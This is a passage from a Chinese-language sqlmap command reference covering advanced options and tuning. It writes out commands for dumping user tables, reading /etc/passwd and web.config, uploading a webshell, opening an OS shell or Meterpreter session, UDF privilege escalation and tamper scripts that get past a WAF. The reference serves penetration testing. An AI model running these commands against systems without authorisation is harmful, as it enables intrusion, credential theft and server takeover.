<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> db</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump-format=CSV</span></span></code></pre></figure>
<h2 id="六高级功能">六、高级功能<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#六高级功能" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="61-文件系统访问">6.1 文件系统访问<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#61-文件系统访问" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--file-read</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">RFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 从服务器读取文件</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --file-read=&quot;/etc/passwd&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --file-read=&quot;C:/windows/system.ini&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--file-write</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">WFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 要写入的本地文件路径</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--file-dest</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">DFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 写入到服务器的目标路径</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --file-write=&quot;/tmp/shell.php&quot; </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               #       --file-dest=&quot;/var/www/html/shell.php&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 读取配置文件</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--file-read</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;/var/www/html/config.php&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--file-read</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;C:/inetpub/wwwroot/web.config&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 写入 Webshell</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--file-write</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;shell.php&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --file-dest</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;/var/www/html/cmd.php&quot;</span></span></code></pre></figure>
<h3 id="62-操作系统访问">6.2 操作系统访问<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#62-操作系统访问" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--os-cmd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">OSCMD</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 执行单条系统命令</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --os-cmd=&quot;whoami&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--os-shell</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 获取交互式操作系统Shell</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--os-pwn</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 获取OOB Shell/Meterpreter/VNC</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--os-smbrelay</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 一键获取OOB Shell通过SMB中继</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--os-bof</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 缓冲区溢出利用</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--priv-esc</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 数据库进程权限提升</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--msf-path</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">MSFPATH</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # Metasploit Framework本地路径</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tmp-path</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TMPPATH</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 远程临时文件目录</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 执行命令示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --os-cmd=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;ipconfig&quot;</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # Windows</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --os-cmd=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;cat /etc/passwd&quot;</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # Linux</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 获取交互式Shell</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --os-shell</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">os-shell</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">> </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">whoami</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">os-shell</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">> </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/passwd</span></span></code></pre></figure>
<h3 id="63-windows注册表操作">6.3 Windows注册表操作<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#63-windows注册表操作" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--reg-read</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 读取注册表键值</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--reg-add</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 写入注册表键值</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--reg-del</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 删除注册表键值</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--reg-key</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">REGKEY</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 注册表键路径</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--reg-value</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">REGVAL</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 注册表值名称</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--reg-data</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">REGDATA</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 注册表值数据</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--reg-type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">REGTYPE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 注册表值类型</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 读取注册表示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--reg-read</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --reg-key=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --reg-value=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;ProductName&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 写入注册表示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--reg-add</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --reg-key=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;HKLM\SOFTWARE\Test&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --reg-value=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;TestValue&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --reg-data=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;123&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --reg-type=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;REG_SZ&quot;</span></span></code></pre></figure>
<h3 id="64-udf注入用户自定义函数">6.4 UDF注入（用户自定义函数）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#64-udf注入用户自定义函数" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--udf-inject</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 注入用户自定义函数</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--shared-lib</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SHLIB</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 共享库本地路径</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># MySQL UDF提权</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --udf-inject</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --shared-lib=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;/path/to/lib_mysqludf_sys.so&quot;</span></span></code></pre></figure>
<h2 id="七性能优化">七、性能优化<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#七性能优化" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="71-优化选项">7.1 优化选项<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#71-优化选项" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-o</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                             # 开启所有优化选项</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--predict-output</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 预测常见查询输出</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--keep-alive</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 使用HTTP持久连接</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--null-connection</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 只检索页面长度（无内容）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--threads</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">THREADS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 最大并发HTTP请求数（默认1）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 建议: --threads=5 （不要超过10）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 最优性能组合</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-o</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --threads=5</span></span></code></pre></figure>
<h3 id="72-性能调优">7.2 性能调优<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#72-性能调优" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--eta</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                          # 显示预计完成时间</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--flush-session</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 刷新当前会话数据</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--fresh-queries</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 忽略会话文件中的查询结果</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--parse-errors</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 从响应中解析并显示DBMS错误</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--preprocess</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">PRE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 使用指定脚本预处理响应</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--postprocess</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">POS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 使用指定脚本后处理响应</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--repair</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 修复损坏的会话文件</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--cleanup</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 清理DBMS中的SQLMap特定UDF和表</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 会话管理</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SESSION.sqlite</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 指定会话文件</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--flush-session</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 清除会话重新测试</span></span></code></pre></figure>
<h3 id="73-速度优化建议">7.3 速度优化建议<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#73-速度优化建议" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 快速检测</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --threads=5</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 针对已知数据库</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--dbms</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">MySQL</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --threads</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 跳过不必要的测试</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--technique</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EU</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --threads</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 减少时间盲注延时</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--time-sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --threads</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span></span></code></pre></figure>
<h2 id="八绕过与规避">八、绕过与规避<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#八绕过与规避" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="81-绕过技术">8.1 绕过技术<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#81-绕过技术" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TAMPER</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 使用Tamper脚本绕过WAF/IPS</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 可以使用多个脚本（逗号分隔）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --tamper=space2comment,between</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--skip-waf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 跳过WAF/IPS启发式检测</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--check-waf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 检测WAF/IPS保护</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--identify-waf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 彻底识别WAF/IPS保护</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 常用组合</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">space2comment</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --delay=2</span></span></code></pre></figure>
<h3 id="82-常用tamper脚本详解">8.2 常用Tamper脚本详解<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#82-常用tamper脚本详解" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 编码类</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apostrophemask.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 单引号替换为UTF-8编码</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # ' → %EF%BC%87</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apostrophenullencode.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 单引号替换为%00%27</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">base64encode.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # Base64编码所有字符</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # SELECT → U0VMRUNUDQo=</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">charencode.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # URL编码非字母数字字符</span></span>
